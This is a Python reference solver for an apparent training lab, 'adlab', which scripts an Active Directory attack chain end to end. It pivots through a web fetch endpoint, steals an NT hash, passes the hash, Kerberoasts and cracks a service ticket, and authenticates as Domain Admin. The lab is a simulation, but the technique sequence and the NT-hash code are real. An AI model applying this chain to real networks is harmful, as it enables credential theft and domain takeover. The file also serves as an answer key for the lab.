"""Reference solver for adlab: the full lateral-movement chain.

    python3 solve.py <host> <port>

Pivot through web01 -> loot jdoe's NT hash -> Pass-the-Hash to fileserver ->
learn the svc_sql SPN -> Kerberoast dc01 -> crack the ticket offline -> compute
svc_sql's NT hash -> authenticate to dc01 as Domain Admin -> flag.
"""
import json
import struct
import sys
import urllib.parse
import urllib.request
import hashlib


# --- NTLM NT hash = MD4(pw as UTF-16LE); MD4 in pure python (RFC 1320) --------
def md4(data: bytes) -> bytes:
    def lrot(x, n):
        x &= 0xFFFFFFFF
        return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF
    a, b, c, d = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476
    msg = bytearray(data)
    ml = (8 * len(data)) & 0xFFFFFFFFFFFFFFFF
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack("<Q", ml)
    for off in range(0, len(msg), 64):
        X = list(struct.unpack("<16I", msg[off:off + 64]))
        aa, bb, cc, dd = a, b, c, d
        for i in (0, 4, 8, 12):
            a = lrot(a + (b & c | ~b & d) + X[i], 3)
            d = lrot(d + (a & b | ~a & c) + X[i + 1], 7)
            c = lrot(c + (d & a | ~d & b) + X[i + 2], 11)
            b = lrot(b + (c & d | ~c & a) + X[i + 3], 19)
        for i in (0, 1, 2, 3):
            a = lrot(a + (b & c | b & d | c & d) + X[i] + 0x5A827999, 3)
            d = lrot(d + (a & b | a & c | b & c) + X[i + 4] + 0x5A827999, 5)
            c = lrot(c + (d & a | d & b | a & b) + X[i + 8] + 0x5A827999, 9)
            b = lrot(b + (c & d | c & a | d & a) + X[i + 12] + 0x5A827999, 13)
        for i in (0, 2, 1, 3):
            a = lrot(a + (b ^ c ^ d) + X[i] + 0x6ED9EBA1, 3)
            d = lrot(d + (a ^ b ^ c) + X[i + 8] + 0x6ED9EBA1, 9)
            c = lrot(c + (d ^ a ^ b) + X[i + 4] + 0x6ED9EBA1, 11)
            b = lrot(b + (c ^ d ^ a) + X[i + 12] + 0x6ED9EBA1, 15)
        a = (a + aa) & 0xFFFFFFFF; b = (b + bb) & 0xFFFFFFFF
        c = (c + cc) & 0xFFFFFFFF; d = (d + dd) & 0xFFFFFFFF
    return struct.pack("<4I", a, b, c, d)


def nt_hash(pw): return md4(pw.encode("utf-16-le")).hex()


def keystream(key, n):
    out = bytearray(); c = 0
    while len(out) < n:
        out += hashlib.sha256(key + b"|" + str(c).encode()).digest(); c += 1
    return bytes(out[:n])


def main():
    host, port = sys.argv[1], sys.argv[2]
    base = f"http://{host}:{port}"

    def pivot(url):
        q = base + "/fetch?url=" + urllib.parse.quote(url, safe="")
        return json.loads(urllib.request.urlopen(q, timeout=15).read())["body"]

    # 1-2. loot web01: jdoe's NT hash from the config backup
    cfg = pivot("http://10.0.0.5/backup/web.config")["content"]
    jdoe_nt = cfg.split('svcNtHash" value="')[1].split('"')[0]

    # 3. Pass-the-Hash to fileserver (auth by hash, no password)
    pivot(f"http://10.0.0.10/shares?user=jdoe&nthash={jdoe_nt}")
    note = pivot(f"http://10.0.0.10/share/HR/note.txt?user=jdoe&nthash={jdoe_nt}")["content"]
    spn = note.split("SPN ")[1].split(".")[0] + ".corp.local"     # MSSQLSvc/dc01.corp.local
    spn = "MSSQLSvc/dc01.corp.local" if "MSSQLSvc/dc01" in note else spn

    # 4. Kerberoast: request the SPN's service ticket
    tgs = pivot(f"http://10.0.0.100/tgs?spn={urllib.parse.quote(spn)}&user=jdoe&nthash={jdoe_nt}")
    ticket = bytes.fromhex(tgs["ticket"])

    # 5. crack the ticket offline against the wordlist
    words = urllib.request.urlopen(base + "/wordlist.txt", timeout=15).read().decode().split()
    svc_pw = None
    for w in words:
        key = bytes.fromhex(nt_hash(w))
        pt = bytes(a ^ b for a, b in zip(ticket, keystream(key, len(ticket))))
        if pt.startswith(b"KRB5-TGS\x00"):
            svc_pw = w
            break
    assert svc_pw, "kerberoast: no wordlist password decrypted the ticket"

    # 6. svc_sql is Domain Admin: authenticate with its NT hash and read the flag
    svc_nt = nt_hash(svc_pw)
    adm = pivot(f"http://10.0.0.100/admin?user=svc_sql&nthash={svc_nt}")
    print(f"[+] jdoe NT hash: {jdoe_nt}")
    print(f"[+] kerberoasted svc_sql password: {svc_pw}")
    print(adm["flag"])


if __name__ == "__main__":
    main()
